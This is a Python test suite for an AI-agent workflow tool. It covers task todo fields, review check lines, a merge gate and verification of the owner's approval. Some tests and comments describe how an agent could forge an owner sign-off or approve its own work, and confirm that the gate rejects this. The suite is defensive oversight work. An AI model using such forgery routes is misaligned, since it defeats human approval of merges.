"""Tests of agent-checks, one class per feature."""

import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)
import os  # noqa: E402
import json  # noqa: E402
import re  # noqa: E402
import subprocess  # noqa: E402
import time  # noqa: E402
from scripthelp import ScriptCase  # noqa: E402
import tempfile  # noqa: E402
import atexit  # noqa: E402
import hashlib  # noqa: E402
import shutil  # noqa: E402


HERE = os.path.dirname(os.path.abspath(__file__))


ROOT = os.path.dirname(HERE)


def only_own(cls):
    own = set(vars(cls))
    for name in dir(cls):
        if name.startswith("test") and name not in own:
            setattr(cls, name, None)
    return cls


def read(*parts):
    with open(os.path.join(ROOT, *parts)) as fh:
        return fh.read()


class Case(ScriptCase):
    script = "agent-file.sh"

    def af(self, *args, **kw):
        return self.repo.run("agent-file.sh", *args, **kw)

    def ok(self, *args, **kw):
        r = self.af(*args, **kw)
        self.assertEqual(r.returncode, 0, "exit %d\n%s\n%s" % (r.returncode, r.stdout, r.stderr))
        return r

    def refused(self, *args, **kw):
        before = self.todo()
        r = self.af(*args, **kw)
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertEqual(len(r.stderr.strip().splitlines()), 1, r.stderr)
        self.assertEqual(self.todo(), before, "a refusal changed agent_todo.txt")
        return r

    def todo(self):
        return self.repo.read("agent_todo.txt")

    def line(self, name):
        for l in self.todo().splitlines():
            if l.split(" | ")[0] == name:
                return l
        self.fail("no todo line %s in:\n%s" % (name, self.todo()))

    def fields(self, name):
        return self.line(name).split(" | ")

    def state(self, folder=None):
        path = os.path.join(folder or self.repo.dir, "agent_state.txt")
        if not os.path.exists(path):
            return ""
        with open(path) as fh:
            return fh.read()


VERIFIED_AT = ("#!/usr/bin/env bash\n"
               "echo 'OWNER ORDER verified ~/.claude/projects/-r/s1.jsonl 2026-11-26 08:40'\n"
               "echo 'match: \"the words\"'\nexit 0\n")


def main_launched(repo_dir, *tasks, at=None):
    """Section 44 F2: the guard's durable records of a reviewer and a check deputy launched by the main manager.
    Section 47 G8: dated within the task instance (default: now)."""
    at = at or time.strftime("%Y-%m-%d %H:%M")
    gd = subprocess.run(["git", "-C", repo_dir, "rev-parse", "--path-format=absolute", "--git-common-dir"],
                        capture_output=True, text=True, check=True).stdout.strip()
    with open(os.path.join(gd, "agent_launches.jsonl"), "a") as fh:
        for t in tasks:
            for kind in ("reviewer", "check-deputy"):
                fh.write(json.dumps({"task": t, "type": kind, "by": "main", "at": at}) + "\n")


class TestTodoAddChecks(Case):

    def test_checks_and_scope_fields_after_guess(self):
        self.ok("todo", "add", "toast", "small", "banner to toast", "10", "--guess", "8",
                "--checks", "PR REVIEW", "--scope", "src/pages/Orders.jsx,src/pages/Orders.test.jsx")
        f = self.fields("toast")
        self.assertEqual(f[3:7], ["est 10m", "guess 8m", "checks PR REVIEW",
                                  "scope src/pages/Orders.jsx,src/pages/Orders.test.jsx"])

    def test_checks_in_table_order_whatever_the_order_given(self):
        self.ok("todo", "add", "exp", "big", "export column", "60", "--checks", "UI CHECK,EXAMPLES TEST")
        self.assertIn("checks EXAMPLES TEST, UI CHECK", self.fields("exp"))

    def test_checks_after_est_without_guess(self):
        self.ok("todo", "add", "w", "small", "wording", "5", "--checks", "PR REVIEW")
        self.assertEqual(self.fields("w")[3:5], ["est 5m", "checks PR REVIEW"])

    def test_an_unknown_block_is_refused(self):
        r = self.refused("todo", "add", "x", "small", "x", "5", "--checks", "PR REVIEW,SMOKE TEST")
        self.assertIn("SMOKE TEST", r.stderr)

    def test_owner_sign_may_be_planned(self):
        # core review defect 6: a permission change needs the owner's sign; dispatch plans it
        self.ok("todo", "add", "p", "big", "who can approve", "60", "--checks", "CORE REVIEW,OWNER SIGN")
        self.assertIn("checks CORE REVIEW, OWNER SIGN", self.fields("p"))
        self.ok("todo", "add", "q", "big", "x", "60")
        self.ok("todo", "checks", "q", "OWNER SIGN")
        self.assertIn("checks OWNER SIGN", self.fields("q"))

    def test_a_tool_block_may_be_planned_too(self):
        self.ok("todo", "add", "x", "small", "x", "5", "--checks", "CORE REVIEW,PR REVIEW")
        self.assertIn("checks PR REVIEW, CORE REVIEW", self.fields("x"))

    def test_old_level_still_works(self):
        self.ok("todo", "add", "old", "small", "x", "5", "--level", "B")
        self.assertIn("level B", self.fields("old"))


class TestTargetAndBatch(Case):
    """Owner 2026-11-25 (section 30): the request decides the target; a batch gets one full run at its end."""

    def test_target_and_batch_fields(self):
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.ok("todo", "add", "x1", "big", "x one", "60", "--target", "production", "--batch", "b1",
                "--owner-quote", "x1 can go straight to production", "--means", "publish x1 to production")   # approval-design: his words + what was read
        f = self.fields("x1")
        self.assertIn("target production", f)
        self.assertIn("batch b1", f)
        self.ok("todo", "add", "x2", "big", "x two", "60", "--batch", "b1")
        self.assertFalse([x for x in self.fields("x2") if x.startswith("target ")])

    def test_a_bad_target_is_refused(self):
        self.refused("todo", "add", "x", "small", "x", "5", "--target", "staging")

    def test_the_last_merge_of_a_batch_says_run_the_full_suite(self):
        for n in ("x1", "x2"):
            self.ok("todo", "add", n, "big", "what", "60", "--batch", "b1")
        r = self.ok("todo", "done", "x1")
        self.assertNotIn("batch b1", r.stdout)
        r = self.ok("todo", "done", "x2")
        self.assertIn("batch b1: all merged: agent-promote.sh --sync, then the full suite: agent-nightly.sh --start",
                      r.stdout.splitlines())


class TestTodoChecks(Case):

    def setUp(self):
        super().setUp()
        self.ok("todo", "add", "t", "big", "task", "60", "--checks", "PR REVIEW")

    def test_add_is_a_union_in_table_order(self):
        r = self.ok("todo", "checks", "t", "UI CHECK,EXAMPLES TEST")
        self.assertEqual(r.stdout.strip(),
                         "todo checks: t PR REVIEW -> PR REVIEW, EXAMPLES TEST, UI CHECK")
        self.assertIn("checks PR REVIEW, EXAMPLES TEST, UI CHECK", self.fields("t"))

    def test_first_checks_on_a_line_without_the_field(self):
        self.ok("todo", "add", "bare", "small", "x", "5")
        r = self.ok("todo", "checks", "bare", "PR REVIEW")
        self.assertEqual(r.stdout.strip(), "todo checks: bare - -> PR REVIEW")
        self.assertIn("checks PR REVIEW", self.fields("bare"))

    def test_every_other_field_stays(self):
        self.ok("todo", "stage", "t", "tests")
        before = [f for f in self.fields("t") if not f.startswith("checks ")]
        self.ok("todo", "checks", "t", "UI CHECK")
        after = [f for f in self.fields("t") if not f.startswith("checks ")]
        self.assertEqual(before, after)

    def test_unknown_task_or_block_refused(self):
        self.refused("todo", "checks", "nope", "PR REVIEW")
        self.refused("todo", "checks", "t", "LOOK AT IT")

    def test_remove_without_a_verified_owner_order_is_refused(self):
        self.repo.write_bin_script("agent-owner-order.sh",
                                   "#!/usr/bin/env bash\necho 'refused: no such owner prompt'\nexit 1\n")
        r = self.refused("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "drop the related tests",
                         "--means", "leave out RELATED TESTS for t")
        self.assertIn("no such owner prompt", r.stderr)

    def test_remove_with_a_verified_owner_order(self):
        log = os.path.join(self.repo.base, "order.log")
        self.repo.write_bin_script("agent-owner-order.sh",
                                   "#!/usr/bin/env bash\nprintf '%%s\\n' \"$@\" > %s\necho 'verified'\nexit 0\n" % log)
        # section 47 G1: PR REVIEW is never removed; another block when the words name it and leaving it out
        self.ok("todo", "checks", "t", "UI CHECK")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "no screen changes, leave the ui check out",
                "--means", "leave out UI CHECK for t")   # approval-design: no fixed sentence
        f = self.fields("t")
        self.assertFalse(any(x.startswith("checks ") and "UI CHECK" in x for x in f), f)
        self.assertTrue(any(re.fullmatch(r"removed UI CHECK \d{4}-\d{2}-\d{2} \d{2}:\d{2}", x) for x in f), f)
        with open(log) as fh:
            args = fh.read().split("\n")
        self.assertEqual(args[0], "verify")
        self.assertIn("--quote", args)
        self.assertIn("no screen changes, leave the ui check out", args)
        self.assertIn("--repo", args)
        # core review defect 1: agent-owner-order.sh verify wants an absolute folder
        repo_arg = args[args.index("--repo") + 1]
        self.assertTrue(os.path.isabs(repo_arg), repo_arg)
        self.assertEqual(os.path.realpath(repo_arg), os.path.realpath(self.repo.dir))


class TestTodoEst(Case):

    def test_est_and_guess_replaced_in_place_rest_stays(self):
        self.ok("todo", "add", "t", "big", "task", "60", "--guess", "50", "--checks", "PR REVIEW")
        self.ok("todo", "stage", "t", "tests")
        self.ok("todo", "wait", "t", "on", "question")
        self.ok("todo", "wait", "t", "off")
        before = self.fields("t")
        r = self.ok("todo", "est", "t", "120", "--guess", "100")
        self.assertEqual(r.stdout.strip(), "todo est: t 60m -> 120m")
        after = self.fields("t")
        # estimate-improve A3: the first estimate is kept as one new field right after est
        self.assertEqual(after[after.index("est 120m") + 1], "est0 60m")
        after.remove("est0 60m")
        self.assertEqual(len(before), len(after))
        for b, a in zip(before, after):
            if b == "est 60m":
                self.assertEqual(a, "est 120m")
            elif b == "guess 50m":
                self.assertEqual(a, "guess 100m")
            else:
                self.assertEqual(a, b)

    def test_est_only_keeps_guess(self):
        self.ok("todo", "add", "t", "big", "task", "60", "--guess", "50")
        self.ok("todo", "est", "t", "90")
        self.assertEqual(self.fields("t")[3:6], ["est 90m", "est0 60m", "guess 50m"])   # estimate-improve A3

    def test_refusals(self):
        self.ok("todo", "add", "t", "big", "task", "60")
        self.refused("todo", "est", "nope", "10")
        self.refused("todo", "est", "t", "ten")
        self.refused("todo", "est", "t", "0")
        self.refused("todo", "est", "t")


class TestCheckLine(Case):

    def test_one_line_in_the_state_file_of_this_folder(self):
        r = self.ok("check", "toast", "PR REVIEW", "pass", "--by", "check deputy", "--evidence", "diff read, 3 files")
        self.assertIn("toast", r.stdout)
        last = self.state().strip().splitlines()[-1]
        self.assertRegex(last, r"^CHECK toast PR REVIEW: pass \| by check deputy \| at [0-9a-f]{12} \| "   # F3
                               r"diff read, 3 files \| "
                               r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}$")
        self.assertNotIn("CHECK", self.todo())

    def test_fail_and_owner_sign(self):
        self.repo.write_bin_script("agent-owner-order.sh", VERIFIED_AT)
        self.ok("check", "t", "BUILD", "fail", "--by", "tm", "--evidence", "tsc: 2 errors")
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes merge it",
                "--means", "merge t with the new roles")
        lines = self.state().strip().splitlines()
        self.assertRegex(lines[-2], r"^CHECK t BUILD: fail \| by tm \| at [0-9a-f]{12} \| tsc: 2 errors \| ")   # F3
        # approval-design (section 53 A7): the quote, what was read, the typed minute
        self.assertRegex(lines[-1], r"^CHECK t OWNER SIGN: pass \| by owner \| at [0-9a-f]{12} \| owner order verified: "
                                    r"yes merge it \| means: merge t with the new roles \| typed: 2026-11-26 08:40 \| ")

    def test_owner_sign_needs_a_verified_owner_quote(self):
        # core review defect 7: any agent could write an OWNER SIGN pass line
        before = self.state()
        r = self.af("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--evidence", "yes")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("--owner-quote", r.stderr)
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho 'refused: not typed'\nexit 1\n")
        r = self.af("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes merge it",
                    "--means", "merge t")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("not typed", r.stderr)
        self.assertEqual(self.state(), before)

    def test_refusals(self):
        for args in (("check", "t", "LOOKED", "pass", "--by", "x", "--evidence", "y"),
                     ("check", "t", "BUILD", "maybe", "--by", "x", "--evidence", "y"),
                     ("check", "t", "BUILD", "pass", "--evidence", "y"),
                     ("check", "t", "BUILD", "pass", "--by", "x"),
                     ("check", "t", "BUILD", "pass", "--by", "x", "--evidence", "a\nb")):
            with self.subTest(args=args):
                before = self.state()
                r = self.af(*args)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                self.assertEqual(self.state(), before)


_GATE_SNAP = {}
_LEVEL_ANSWERS = {}

# tests that keep the real agent-file.sh command line for the verb they check (one per verb and exit path)
REAL_SHELL = {
    "TestGate.test_refused_while_a_planned_block_has_no_pass_line",
    "TestGate.test_pass_when_every_planned_block_passed",
    "TestGate.test_checks_gather_keeps_a_worktrees_lines_in_main",
    "TestGate.test_no_todo_line_needs_checks",
    "TestGate.test_builder_field_on_the_todo_line",
    "TestTodoTarget.test_r2_the_line_keeps_its_instance",
    "TestTodoTarget.test_r2_a_working_target_becomes_production",
    "TestTodoTarget.test_s1_it_prints_the_next_step",
    "TestTodoTarget.test_r2_refusals_change_nothing",
}


class TestGate(Case):
    """The task's branch is committed and pushed (core review defect 4: the gate plans what merges)."""

    def git(self, *args, cwd=None):
        return subprocess.run(["git", "-C", cwd or self.repo.dir] + list(args), check=True,
                              capture_output=True, text=True).stdout

    def write(self, files, cwd=None):
        for rel, body in files.items():
            full = os.path.join(cwd or self.repo.dir, rel)
            os.makedirs(os.path.dirname(full) or ".", exist_ok=True)
            with open(full, "w") as fh:
                fh.write(body)

    def commit_push(self, files, cwd=None, push=True):
        self.write(files, cwd)
        self.git("add", *files, cwd=cwd)
        self.git("commit", "-q", "-m", "change", cwd=cwd)
        if push:
            self.git("push", "-q", "-u", "origin", "HEAD", cwd=cwd)

    def setUp(self):
        super().setUp()
        self.origin = os.path.join(self.repo.base, "origin.git")
        snap = _GATE_SNAP.get("dir")
        if snap and not os.environ.get("AGENT_TEST_NO_TEMPLATE"):
            # test-slim: the fixture below is built once per process; a test gets a copy
            # (the remote URL is the one absolute path in it: set again)
            shutil.rmtree(self.repo.dir)
            shutil.copytree(os.path.join(snap, "project"), self.repo.dir, symlinks=True)
            shutil.copytree(os.path.join(snap, "origin.git"), self.origin, symlinks=True)
            self.git("remote", "set-url", "origin", self.origin)
            return
        subprocess.run(["git", "init", "-q", "--bare", self.origin], check=True, capture_output=True)
        self.write({"app.js": "x()\n"})
        self.git("add", "app.js")
        self.git("commit", "-q", "-m", "base")
        self.git("tag", "base")
        self.git("remote", "add", "origin", self.origin)
        self.git("checkout", "-q", "-b", "feat")
        self.git("push", "-q", "-u", "origin", "feat")
        # tool blocks of this diff: DIFF SCAN, BUILD, RELATED TESTS (none found)
        self.commit_push({"app.js": "y()\n"})
        self.ok("todo", "add", "t", "small", "task", "10", "--checks", "PR REVIEW")
        main_launched(self.repo.dir, "t")                           # section 44 F2
        if not os.environ.get("AGENT_TEST_NO_TEMPLATE"):
            snap = tempfile.mkdtemp(prefix="gate_fixture_")
            atexit.register(shutil.rmtree, snap, True)
            shutil.copytree(self.repo.dir, os.path.join(snap, "project"), symlinks=True)
            shutil.copytree(self.origin, os.path.join(snap, "origin.git"), symlinks=True)
            _GATE_SNAP["dir"] = snap

    # test-slim: the gate family runs the verbs whose logic is Python (check, checks gate/gather,
    # todo checks/target/builder/est) in this process; the tests named in REAL_SHELL, and any
    # run with an env this helper does not model, keep the real agent-file.sh command line.
    def af(self, *args, **kw):
        cmd = None
        if args[:1] == ("check",):
            cmd, rest = "check", args[1:]
        elif args[:2] in (("checks", "gate"), ("checks", "gather")):
            cmd, rest = args[1], args[2:]
        elif args[:2] in (("todo", "checks"), ("todo", "target"), ("todo", "builder"), ("todo", "est")):
            cmd, rest = "todo-" + args[1], args[2:]
        env = kw.get("env") or {}
        key = "%s.%s" % (type(self).__name__, self._testMethodName)
        if (cmd is None or key in REAL_SHELL or set(env) - {"CLAUDE_PROJECT_DIR", "AGENT_FAKE_NOW"}
                or set(kw) - {"env", "cwd"}):
            return super().af(*args, **kw)
        # what agent-file.sh's roots_read and clock hand to agent_checks.py
        merged = self.repo._env(env)
        cwd = kw.get("cwd") or self.repo.cwd
        start = os.path.realpath(merged.get("CLAUDE_PROJECT_DIR") or cwd)
        lst = subprocess.run(["git", "-C", start, "worktree", "list", "--porcelain"], capture_output=True,
                             text=True).stdout.splitlines()
        root = ([l.split(" ", 1)[1] for l in lst if l.startswith("worktree ")] or [start])[0]
        top = subprocess.run(["git", "-C", start, "rev-parse", "--show-toplevel"], capture_output=True,
                             text=True).stdout.strip() or start
        now = merged.get("AGENT_FAKE_NOW") or time.strftime("%Y-%m-%d %H:%M")
        self.share_level_runs()
        return self.repo.run_py("agent_checks", "agent_checks.py", root, top, now, cmd, *rest, env=env, cwd=cwd)

    def share_level_runs(self):
        """The gate asks agent-level.sh which tool blocks the diff plans (0.3 s a run) and keeps blocks and sign
        only. Two runs on the very same repo state (same HEAD and base commits, same working tree files, same
        conf) answer the same: the process keeps the first answer per state. The first call of a test runs for real."""
        mod = self.repo.__dict__.get("_py_modules", {}).get(os.path.join(self.repo.plugin_bin, "agent_checks.py"))
        if mod is None or getattr(mod, "_level_shared", False):
            return
        real = mod.tool_blocks
        repo_dir = self.repo.dir

        def tool_blocks(dirpath, base):
            key = None
            try:
                shas = subprocess.run(["git", "-C", dirpath, "rev-parse", "HEAD", base], capture_output=True,
                                      text=True, check=True).stdout.split()
                status = subprocess.run(["git", "-C", dirpath, "status", "--porcelain", "-z", "-uall"],
                                        capture_output=True, check=True).stdout
                h = hashlib.sha1(status)
                for entry in status.split(b"\0"):
                    if len(entry) > 3:
                        try:
                            with open(os.path.join(dirpath, entry[3:].decode()), "rb") as fh:
                                h.update(fh.read())
                        except OSError:
                            pass
                for conf in (os.path.join(repo_dir, "agent_repo.conf"),
                             os.path.join(repo_dir, ".git", "agent_test_weights.json")):
                    try:
                        with open(conf, "rb") as fh:
                            h.update(fh.read())
                    except OSError:
                        h.update(b"-")
                key = (base, tuple(shas), h.hexdigest())
            except (OSError, subprocess.CalledProcessError):
                pass
            if key is not None and key in _LEVEL_ANSWERS:
                blocks, sign = _LEVEL_ANSWERS[key]
                return list(blocks), sign
            blocks, sign = real(dirpath, base)
            if key is not None:
                _LEVEL_ANSWERS[key] = (list(blocks), sign)
            return blocks, sign

        mod.tool_blocks = tool_blocks
        mod._level_shared = True

    def at_now(self):
        """(head sha12, the todo line's opened minute): a hand line that belongs to this task instance (G9)."""
        line = [l for l in open(os.path.join(self.repo.dir, "agent_todo.txt")) if l.startswith("t | ")][0]
        return self.git("rev-parse", "HEAD").strip()[:12], line.split("opened ")[1][:16]

    def gate(self, *extra, env=None, dirpath=None):
        return self.af("checks", "gate", "t", "--dir", dirpath or self.repo.dir, "--base", "base", *extra, env=env)

    def passes(self, *blocks, cwd=None):
        for b in blocks:
            self.ok("check", "t", b, "pass", "--by", "tm", "--evidence", "ok", cwd=cwd)

    def test_refused_while_a_planned_block_has_no_pass_line(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        lines = r.stdout.splitlines()
        self.assertIn("PR REVIEW: missing", lines)
        self.assertIn("BUILD: pass (by tm)", lines)
        self.assertEqual(lines[-1], "GATE REFUSED t: PR REVIEW missing")

    def test_pass_when_every_planned_block_passed(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual(r.stdout.splitlines()[-1], "GATE PASS t")

    def test_the_tool_blocks_come_from_the_diff_not_the_todo_line(self):
        self.passes("PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 1)
        self.assertIn("BUILD: missing", r.stdout.splitlines())
        self.assertIn("DIFF SCAN: missing", r.stdout.splitlines())

    def test_the_last_line_of_a_block_wins(self):
        self.passes("DIFF SCAN", "RELATED TESTS", "PR REVIEW")
        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok")
        self.ok("check", "t", "BUILD", "fail", "--by", "check deputy", "--evidence", "lint red")
        r = self.gate()
        self.assertEqual(r.returncode, 1)
        self.assertIn("BUILD: fail (by check deputy)", r.stdout.splitlines())
        self.assertEqual(r.stdout.splitlines()[-1], "GATE REFUSED t: BUILD fail")

    def test_another_tasks_lines_do_not_count(self):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW"):
            self.ok("check", "other", b, "pass", "--by", "tm", "--evidence", "ok")
        self.assertEqual(self.gate().returncode, 1)

    def test_a_signing_block_plans_owner_sign(self):
        self.commit_push({"package-lock.json": '{"a": 2}\n'})
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW", "MODULE TESTS")
        r = self.gate()
        self.assertEqual(r.returncode, 1)
        self.assertIn("OWNER SIGN: missing", r.stdout.splitlines())
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes, merge", "--means", "merge t")
        self.assertEqual(self.gate().returncode, 0)

    def test_a_planned_owner_sign_is_gated(self):
        # core review defect 6
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 1)
        self.assertIn("OWNER SIGN: missing", r.stdout.splitlines())

    # -- core review defect 4: the gate plans what merges

    def test_a_dirty_tree_is_refused(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        self.write({"app.js": "z()\n"})
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertEqual(r.stdout.splitlines()[-1],
                         "GATE REFUSED t: uncommitted changes in %s (commit and push them, or drop them)" % self.repo.dir)

    def test_agent_files_do_not_make_it_dirty(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        self.write({"agent_state.trim-2026-11-25.txt": "x\n"})
        self.assertEqual(self.gate().returncode, 0, self.gate().stdout)

    def test_an_unpushed_head_is_refused(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        self.commit_push({"app.js": "w()\n"}, push=False)
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertEqual(r.stdout.splitlines()[-1], "GATE REFUSED t: HEAD is not its pushed branch origin/feat")

    def test_no_upstream_is_a_note(self):
        self.git("checkout", "-q", "-b", "local-only")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn("note: no upstream: the gate plans this local HEAD", r.stdout.splitlines())

    # -- core review defect 3: --dir decides, not CLAUDE_PROJECT_DIR

    def test_claude_project_dir_does_not_move_the_plan(self):
        # the task's worktree bumps the lockfile; the main folder (CLAUDE_PROJECT_DIR of a hook or the
        # watch) does not: the plan must come from --dir, so OWNER SIGN is planned
        wt = os.path.join(self.repo.base, "wt_lock")
        self.git("worktree", "add", "-q", "-b", "feat-lock", wt, "feat")
        self.commit_push({"package-lock.json": '{"a": 2}\n'}, cwd=wt)
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW", "MODULE TESTS")
        r = self.gate(env={"CLAUDE_PROJECT_DIR": self.repo.dir}, dirpath=wt)
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("OWNER SIGN: missing", r.stdout.splitlines())

    # -- core review defect 2: result lines written from the main repo count

    def test_lines_in_the_main_repos_state_count_for_a_worktree(self):
        wt = os.path.join(self.repo.base, "wt_t")
        self.git("worktree", "add", "-q", "-b", "feat-wt", wt, "feat")
        self.git("push", "-q", "-u", "origin", "feat-wt", cwd=wt)
        self.passes("DIFF SCAN", "BUILD", cwd=wt)                    # the task manager, in its worktree
        self.passes("RELATED TESTS")                                 # a deputy of the main manager, in main
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Check", "--evidence", "read it")
        r = self.gate(dirpath=wt)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    # -- re-check defect A: the newest line wins, and a removed worktree keeps its lines

    def test_the_newest_line_wins_across_files(self):
        wt = os.path.join(self.repo.base, "wt_a")
        self.git("worktree", "add", "-q", "-b", "feat-a", wt, "feat")
        self.git("push", "-q", "-u", "origin", "feat-a", cwd=wt)
        with open(os.path.join(wt, "agent_state.txt"), "a") as fh:
            # G9: within the task instance and at the branch's commit; the fail and the pass of one minute: fail wins
            for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
                fh.write("CHECK t %s: pass | by tm | at %s | ok | %s\n" % ((b,) + self.at_now()))
            fh.write("CHECK t PR REVIEW: fail | by t Check | at %s | a typo | %s\n" % self.at_now())
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t PR REVIEW: pass | by t Check | at %s | ok | %s\n" % self.at_now())
        r = self.gate(dirpath=wt)
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: fail (by t Check)", r.stdout.splitlines())

    def test_checks_gather_keeps_a_worktrees_lines_in_main(self):
        wt = os.path.join(self.repo.base, "wt_g")
        self.git("worktree", "add", "-q", "-b", "feat-g", wt, "feat")
        self.passes("DIFF SCAN", "BUILD", cwd=wt)
        self.ok("check", "other", "BUILD", "pass", "--by", "tm", "--evidence", "ok", cwd=wt)
        r = self.ok("checks", "gather", "t", "--dir", wt)
        self.assertEqual(r.stdout.strip(), "checks gather: t 2 lines")
        main = self.state()
        self.assertEqual(len([l for l in main.splitlines() if l.startswith("CHECK t ")]), 2)
        self.assertNotIn("CHECK other", main)
        self.assertEqual(self.ok("checks", "gather", "t", "--dir", wt).stdout.strip(), "checks gather: t 0 lines")

    # -- re-check defect B: an OWNER SIGN pass line is believed only when verified

    def test_state_add_refuses_a_check_line(self):
        r = self.af("state", "add", "CHECK t OWNER SIGN: pass | by owner | ok")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("agent-file.sh check", r.stderr)
        self.assertNotIn("CHECK t OWNER SIGN", self.state())

    def test_a_forged_owner_sign_line_is_not_accepted(self):
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t OWNER SIGN: pass | by owner | at %s | ok | %s\n" % self.at_now())   # G9
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("OWNER SIGN: pass not verified, not accepted", r.stdout.splitlines())

    def test_a_verified_owner_sign_line_is_checked_again(self):
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t OWNER SIGN: pass | by owner | at %s | owner order verified: yes merge it | "
                     "means: merge t | typed: - | %s\n" % self.at_now())                     # G9; section 53 A7
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.assertEqual(self.gate().returncode, 0, self.gate().stdout)
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho 'not found'\nexit 1\n")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("OWNER SIGN: pass not verified, not accepted", r.stdout.splitlines())

    def test_check_owner_sign_passes_its_time(self):
        log = os.path.join(self.repo.base, "order.log")
        self.repo.write_bin_script("agent-owner-order.sh",
                                   "#!/usr/bin/env bash\nprintf '%%s\\n' \"$@\" > %s\necho verified\nexit 0\n" % log)
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes merge it",
                "--means", "merge t", "--time", "2026-11-25 13:40")
        with open(log) as fh:
            args = fh.read().split("\n")
        self.assertEqual(args[args.index("--time") + 1], "2026-11-25 13:40")

    # -- core review defect 5: builders by name

    def test_the_task_manager_worker_and_deputy_are_builders_by_name(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        for who in ("t Task Manager", "t Worker 2", "t Worker 1: toast", "t Deputy"):
            with self.subTest(who=who):
                self.ok("check", "t", "PR REVIEW", "pass", "--by", who, "--evidence", "read it")
                r = self.gate()
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("PR REVIEW: pass by the builder (%s), not accepted" % who, r.stdout.splitlines())

    def test_the_check_deputy_is_no_builder(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Check", "--evidence", "read it")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_results_from_a_file(self):
        path = os.path.join(self.repo.base, "report.txt")
        with open(path, "w") as fh:
            for b in ("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW"):
                fh.write("CHECK t %s: pass | by tm | at %s | ok | %s\n"            # section 44 F3: the commit
                         % (b, self.git("rev-parse", "HEAD").strip()[:12], time.strftime("%Y-%m-%d %H:%M")))
        r = self.gate("--results", path)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_results_from_a_report_with_indented_lines(self):
        # final review: the REPORT is written with state add, which refuses a line starting with CHECK,
        # so the REPORT carries the CHECK lines indented; --results reads them with the indent
        path = os.path.join(self.repo.base, "report.txt")
        with open(path, "w") as fh:
            fh.write("=== REPORT ===\nDONE PASS t\n")
            for b in ("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW"):
                fh.write("  CHECK t %s: pass | by t Check | at %s | ok | %s\n"     # section 44 F3: the commit
                         % (b, self.git("rev-parse", "HEAD").strip()[:12], time.strftime("%Y-%m-%d %H:%M")))
        r = self.gate("--results", path)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_the_base_defaults_to_the_working_branch(self):
